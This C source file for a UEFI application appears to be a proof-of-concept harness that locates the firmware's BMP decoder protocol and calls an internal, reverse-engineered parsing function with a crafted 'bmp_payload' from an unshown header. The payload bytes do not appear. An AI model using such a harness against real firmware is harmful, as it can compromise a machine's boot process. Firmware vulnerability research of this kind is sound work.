#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/MemoryAllocationLib.h>
#include "payload.h"

typedef signed long long __int64 ;

//A6396A81-8031-4FD7-BD14-2E6BFBEC83C2	EFI_BMP_DECODER_PROTOCOL_GUID	InstallProtocolInterface	Current
#define EFI_BMP_DECODER_PROTOCOL_GUID \
    { 0xA6396A81, 0x8031, 0x4FD7, { 0xbd, 0x14, 0x2e, 0x6B, 0xFB, 0xEC, 0x83, 0xC2 } }

typedef struct {
    __int64 (*sub_67E4498)(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
} MY_PROTOCOL;

EFI_GUID gEFI_BMP_DECODER_PROTOCOL_GUID = EFI_BMP_DECODER_PROTOCOL_GUID;

EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS Status;
  UINTN HandleCount;
  EFI_HANDLE *HandleBuffer;
  MY_PROTOCOL *MyProtocol = NULL;

  Status = gBS->LocateHandleBuffer (
                  ByProtocol,
                  &gEFI_BMP_DECODER_PROTOCOL_GUID,
                  NULL,
                  &HandleCount,
                  &HandleBuffer
                  );
  if (EFI_ERROR (Status)) {
    Print(L"Error! Can't find any handle with gEFI_BMP_DECODER_PROTOCOL_GUID: %r\n", Status);
    return Status;
  }

  Print(L"Found %d handles with MyProtocol\n", HandleCount);

    // 찾은 핸들 중 첫 번째 핸들에 대해 MyProtocol을 검색
    Status = gBS->HandleProtocol(HandleBuffer[0], &gEFI_BMP_DECODER_PROTOCOL_GUID, (VOID**)&MyProtocol);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to get protocol interface: %r\n", Status);
        FreePool(HandleBuffer);
        return Status;
    }

    if (MyProtocol != NULL && MyProtocol->sub_67E4498 != NULL) {
        void *my_bmp = (void*)bmp_payload;
        MyProtocol->sub_67E4498(0, 0, (__int64)my_bmp, 0, 0x36);

    } else {
        Print(L"MyProtocol or sub_67E4498 is NULL\n");
    }

    if(HandleBuffer != NULL)
      FreePool(HandleBuffer);

  return Status;
}
